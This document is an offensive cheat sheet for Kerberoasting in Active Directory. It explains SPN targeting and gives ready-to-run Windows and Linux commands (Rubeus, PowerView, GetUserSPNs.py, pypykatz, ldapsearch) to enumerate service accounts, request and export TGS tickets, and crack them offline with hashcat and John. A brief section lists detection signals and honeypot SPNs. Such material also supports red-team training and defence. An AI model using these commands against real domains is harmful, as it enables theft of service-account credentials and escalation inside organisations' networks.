## Information

Kerberoasting is a technique used to recover the cleartext password of the service account associated with an SPN through offline cracking. This attack is generally not viable against services running as computer accounts because those passwords are long, automatically managed by Active Directory, and rotated regularly. In practice, Kerberoasting is primarily useful against user-backed service accounts.


- [ ] Ticket Types

- TGT → (`ada@krbtgt-DOMAIN.LOCAL`) Encrypted with the secret key of `krbtgt`. It is useful for authentication workflows such as Pass-the-Ticket or Golden Ticket abuse, but it is not crackable for password recovery.
- TGS → (`ada@CIFS~DC01-DOMAIN.LOCAL`) Encrypted with the hash of the service account. This is the ticket that gets extracted and cracked.

- [ ] OPSEC

From an OPSEC perspective, every Kerberoasting TGS-REP request generates Event ID 4769 on the domain controller, so it is easy to detect a user requesting multiple tickets in a short period. Tools such as Rubeus also tend to request RC4-encrypted tickets by default, which can be another signal. A strong defensive tactic is to configure fake SPNs as honeypots. They should never generate a legitimate TGS-REQ, so any request against them becomes a high-fidelity alert.

- [ ] Common SPNs in Active Directory

> Do not focus on the service. Focus on the account behind the SPN.

```powershell
# user-backed service account -> potentially crackable
MSSQLSvc/... -> svc_sql      -> ✔️ attack
HTTP/...     -> web_svc      -> ✔️ attack

# computer account (host$) -> usually useless for roasting
CIFS/...     -> server01$    -> ❌ ignore
LDAP/...     -> DC01$        -> ❌ ignore
HOST/...     -> host$        -> ❌ ignore
```

| Service              | Target?                         | Real-world note                                   |
| -------------------- | ------------------------------- | ------------------------------------------------- |
| MSSQLSvc             | Yes                             | Top target for service accounts                   |
| HTTP                 | Yes                             | Very common in web/service apps                   |
| CIFS                 | Depends                         | Useful only if it is **not** a host$ account      |
| HOST                 | Rare                            | Only if assigned to a user account                |
| TERMSRV              | No                              | Usually machine-backed                            |
| LDAP                 | Abuse value, not cracking value | Usually not crackable, but important for AD abuse |
| GC                   | No                              | Same logic as LDAP                                |
| WSMAN                | Maybe                           | Interesting if backed by a service account        |
| SMTP                 | Maybe                           | Sometimes useful                                  |
| Exchange (HTTP/mail) | Yes                             | Good target                                       |
| Custom SPN           | Yes                             | Always review manually                            |

- [ ] Setting SPNs

```powershell
# Rebuild full SPNs
setspn.exe -r host_name

# Register a single SPN
setspn.exe -s HTTP/host.domain.local host_name
```

## Windows

- [ ] Enumerating SPNs

Use `-Credential $Cred -Server dom-dc-1` when you are outside the right security context, for example from an enumeration host that is not the DC.

```powershell
# setspn
setspn -l host$

# AD
Get-ADObject -LDAPFilter "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" -Properties samaccountname,serviceprincipalname | %{$_.samaccountname;$_.serviceprincipalname;"---"}

# PowerView
Get-DomainObject -LDAPFilter "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" -Properties samaccountname,serviceprincipalname | %{$_.samaccountname;$_.serviceprincipalname;"---"}
Get-NetUser -SPN -Verbose | select samaccountname

# ADSearch.exe
.\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname

# Rubeus
.\Rubeus.exe kerberoast
```

Kerberoasting can also be performed across forest trusts:

```powershell
# Powerview
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}

# AD Module
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalName -Server $_.Name}
```

- [ ] TGS Ticket Extraction (request + extraction + hash format)

```powershell
# Kerberoast a specific user  
.\Rubeus.exe kerberoast /domain:domain.local /user:user /simple /outfile:user.txt  
  
# Kerberoast a specific SPN  
.\Rubeus.exe kerberoast /domain:domain.local /spn:MSSQLSvc/host.domain.com:1433 /nowrap  
  
# PowerView: request SPN ticket and export in hashcat format  
Get-DomainUser -Domain domain.local -Identity user | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\user.csv -NoTypeInformation
```

- [ ] OPSEC-friendly alternative (TGS request only / cross-forest friendly)

> This is useful when you want to force creation of the TGS so it lands in cache and can then be extracted separately.

```powershell
# Request a TGS natively -> ticket is stored in cache (NO hash output)  
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/host.domain.com:1433@DOMAIN.LOCAL"  
  
# Verify the ticket is present in cache  
klist  
  
# Extract the ticket afterward (for cracking)
``` 

- [ ] Cracking

```bash
# Extract Kerberoast hashes from the CSV, remove quotes, and save them to a file for cracking
grep -o '\$krb5tgs\$.*' all_tgs.csv | sed 's/"//g' > hashes_tgs.txt
hashcat -a 0 -m 13100 hashes_tgs.txt rock.list

# Crack the extracted hash using John the Ripper with a wordlist
john.exe --wordlist=.\rock.list .\user.txt
```
## Linux


- [ ] Enumerate SPNs

```bash
# Per user
ldapsearch -x -H ldap://IP_TARGET -D "domain\\ada" -w 'password' -b "(sAMAccountName=user)" servicePrincipalName,samaccounttype,sAMAccountName

# All users
ldapsearch -x -H ldap://IP_TARGET -D "domain\\ada" -w 'password' -b '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' samaccountname,samaccounttype,serviceprincipalname
```

- `samAccountType=805306368` → Only regular user accounts (no groups, no computers).
- `!(UserAccountControl:1.2.840.113556.1.4.803:=2)` → Excludes disabled accounts.

- [ ] TGS Ticket Extraction

```bash
# Single SPN
GetUserSPNs.py -dc-ip DC_IP domain.local/user:password -request-user user -outputfile user_tgs

# All SPNs
GetUserSPNs.py -dc-ip DC_IP domain.local/user:password -request -outputfile tickets_tgs

# pypykatz
pypykatz kerberos spnroast -d domain.local -t SAPService -e 23 'kerberos+password://domain.local\user:password@DC_IP'
```

- `pypykatz kerberos spnroast` → Uses the SPN roasting function to request TGS tickets that can be cracked offline.
- `-d domain.local` → Target domain of the user and service.
- `-t user` → Target account with an SPN registered.
- `-e 23` → Encryption type (`23 = RC4-HMAC`, vulnerable).
- `kerberos+password://domain.local\user:password` → Username and password.
- `@DC_IP` → Domain Controller issuing the ticket.

- [ ] Cracking

```powershell
hashcat -m 13100 user_tgs rock.list
```

